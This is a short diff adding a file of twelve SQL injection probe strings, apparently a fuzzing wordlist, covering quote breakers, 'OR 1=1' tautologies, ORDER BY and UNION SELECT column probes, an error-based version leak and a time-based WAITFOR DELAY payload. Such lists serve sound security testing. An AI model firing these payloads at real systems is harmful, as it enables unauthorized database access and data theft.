@@ -1,0 +1,12 @@
+'
+"
+'--
+"--
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+1' ORDER BY 1--
+1' UNION SELECT NULL--
+' AND 1=CONVERT(int,@@version)--
+'; WAITFOR DELAY '0:0:5'--
